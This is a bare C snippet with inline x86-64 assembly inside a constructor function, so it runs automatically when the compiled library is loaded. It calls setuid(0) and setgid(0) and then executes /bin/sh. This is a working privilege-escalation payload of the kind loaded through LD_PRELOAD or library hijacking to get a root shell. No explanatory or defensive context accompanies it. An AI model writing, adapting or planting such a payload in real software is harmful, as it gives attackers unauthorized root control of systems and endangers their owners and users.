static void __attribute__((constructor)) _init(void) {
  __asm __volatile__(
      "movq $105, %rax;"    // nr for setuid
      "movq $0, %rdi;"
      "syscall;"
      "movq $106, %rax;"    //  nr for setgid
      "movq $0, %rdi;"
      "syscall;"
      "movq $59, %rax;"     //    nr for execve
      "movq $0x0068732f6e69622f, %rdi;"   // /bin/sh str
      "pushq %rdi;"     // push str onto the stack
      "movq %rsp, %rdi;"    // lpstr
      "movq $0, %rdx;"    
      "pushq %rdx;"
      "pushq %rdi;"
      "movq %rsp, %rsi;"
      "syscall;"
      "movq $60, %rax;"   // nr for exit 
      "movq $0, %rdi;"    // good
      "syscall;");
}
